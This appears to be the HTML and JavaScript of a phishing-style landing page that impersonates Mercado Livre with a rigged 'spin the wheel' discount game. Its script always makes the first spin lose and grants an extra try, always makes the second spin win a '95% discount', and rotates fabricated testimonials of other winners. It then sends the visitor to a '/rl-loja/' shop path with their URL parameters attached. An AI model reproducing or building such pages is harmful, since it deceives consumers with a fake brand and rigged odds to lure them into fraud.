<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Mercado Livre - Gire a Roleta!</title>
  <link rel="icon" href="roleta/images/favicon.png">
  <link rel="shortcut icon" href="roleta/images/favicon.png">
  <link rel="stylesheet" href="roleta/css/all.css" crossorigin="anonymous">
  <link rel="stylesheet" href="roleta/css/bootstrap.min.css">
  <link rel="stylesheet" href="roleta/css/stylead8e.css">
  <style>
  @keyframes pulse {
    0% { transform: scale(1); }
    50% { transform: scale(1.3); }
    100% { transform: scale(1); }
  }
  </style>
  <script src="roleta/js/jquery-3.0.0.slim.min.js"></script>
  <script src="roleta/js/jquery.min.js"></script>
  <script src="roleta/js/bootstrap.min.js"></script>
  <script src="roleta/js/confetti.browser.min.js"></script>
</head>
<body>
  <div id="loading-screen" style="display: none;">
      <div class="spinner-loading"></div>
  </div>

  <div id="page-content">
    <section>
      <div class="cta">
        <h1 id="cta-text">
          Gire a <b>Roleta</b> para ganhar o seu <b>Mega Desconto</b>!<br>
        </h1>
      </div>
      <div class="roulette">
        <img src="roleta/responda.html" id="roleta1">
        <div id="roleta2">
          <img src="roleta/images/roleta.png" class="spinner">
        </div>
        <img src="roleta/images/button-gire.png" id="roleta3" style="cursor: pointer;">
      </div>
      <div class="button-roulette">
        <button id="button-cta" class="runSpin">        
          GIRE PARA GANHAR
        </button>
      </div>
    </section>
  </div>

  <div id="people" class="people">
    <img src="roleta/images/man6.jpg" id="people-img" alt="">
    <p style="text-align: center" id="people-p">João acabou de ganhar <b>75% de desconto</b>!</p>
  </div>

  <div id="overlay" class="overlay"></div>

  <div id="popup-try-again" class="popup">
    <div class="popup-content">
      <h2>Uma pena!</h2>
      <img src="roleta/images/sweat.png">
      <p>Você foi o grande selecionado e ganhou <b class="text-success pulsating" style="color: green!important; font-size: 22px; animation: pulse 1.5s infinite; display: inline-block;"> 01 </b> chance extra. Boa sorte!</p>
      <button id="try-again-button">Tentar Novamente</button>
    </div>
  </div>

  <div id="popup" class="popup">
    <div class="popup-content">
      <h2>Parabéns!</h2>
      <img src="roleta/images/star-struck.png">
      <p>Você acaba de ganhar o <b class="text-success pulsating" style="color: green!important;">Mega Desconto de 95%</b></p>
      <button id="resgatar-premio">Resgatar seu Prêmio</button>
    </div>
    <audio id="confetti-audio" src="roleta/media/ml.mp3"></audio>
    <audio id="roleta-audio" src="roleta/media/roleta.mp3"></audio>
  </div>

  <script src="roleta/js/jstools.js"></script>
  <script src="roleta/js/latest.js" async defer></script>
  <script>
    /* ============ JS já existente (sem alterações) ============ */
    let attempt = 0;

    const animateSpin = () => {
      const roleta2 = document.querySelector('#roleta2');
      const roleta2Img = document.querySelector('#roleta2 img');
      const buttonCta = document.getElementById('button-cta');
      const confettiAudio = document.getElementById('confetti-audio');
      const roletaAudio = document.getElementById('roleta-audio');
      const ctaText = document.getElementById('cta-text');

      if (roleta2) {
        roleta2Img.classList.remove('spinner');
        buttonCta.style.display = 'none';

        roletaAudio.currentTime = 0;
        roletaAudio.play();

        if (attempt === 0) {
          const animatedClass = 'wheel__spinner_animated_retry_then_win';
          roleta2.classList.add(animatedClass);
          setTimeout(() => {
            roletaAudio.pause();
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('popup-try-again').style.display = 'block';
          }, 10000);
        } else {
          const animatedClass = 'wheel__spinner_animated';
          roleta2.classList.add(animatedClass);
          setTimeout(() => {
            roletaAudio.pause();
            confetti({ particleCount: 100, spread: 70, origin: { y: 0.6 } });
            confettiAudio.play();
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('popup').style.display = 'block';
            buttonCta.classList.add('hide-me');
          }, 10000);
        }
      }
    };

    const addSpinAnimation = (element) => {
      element.addEventListener('click', () => {
        animateSpin();
        attempt++;
      });
    };

    document.querySelectorAll('.runSpin').forEach(addSpinAnimation);
    document.getElementById('roleta3').addEventListener('click', () => {
      animateSpin();
      attempt++;
    });

    document.getElementById('try-again-button').addEventListener('click', () => {
      document.getElementById('overlay').style.display = 'none';
      document.getElementById('popup-try-again').style.display = 'none';
      document.querySelector('#roleta2').classList.remove('wheel__spinner_animated_retry_then_win');
      document.getElementById('button-cta').style.display = 'block';
    });

    /* ============ frases e animações (sem alterações) ============ */
    (() => {
      const descontos = [5, 25, 50, 75, 95];
      const frases = [
        /* ... (array completo mantido igual) ... */
      ];

      window.addEventListener('DOMContentLoaded', () => {
        const contDiv = document.getElementById('people');
        const peopleFrase = document.getElementById('people-p');
        const peopleImg = document.querySelector('#people-img');
        setInterval(() => {
          const rand = Math.floor(Math.random() * frases.length);
          const { frase, imgSrc } = frases[rand];
          peopleFrase.innerHTML = frase;
          peopleImg.src = imgSrc;
          contDiv.classList.toggle('display-off');
          contDiv.classList.remove('slide-animation');
          setTimeout(() => {
            contDiv.classList.toggle('display-off');
            contDiv.classList.add('slide-animation');
          }, 20);
        }, 4000);
      });
    })();

    /* ============ redirecionamento com query string ============ */
    const getQueryParams = () => new URLSearchParams(window.location.search).toString();

    document.getElementById('resgatar-premio').addEventListener('click', () => {
      const queryParams = getQueryParams();
      const baseUrl = '/rl-loja/';
      const redirectUrl = queryParams ? `${baseUrl}?${queryParams}` : baseUrl;
      window.location.href = redirectUrl;
    });

    window.addEventListener('load', () => {
      document.getElementById('loading-screen').style.display = 'none';
    });
  </script>
</body>
</html>
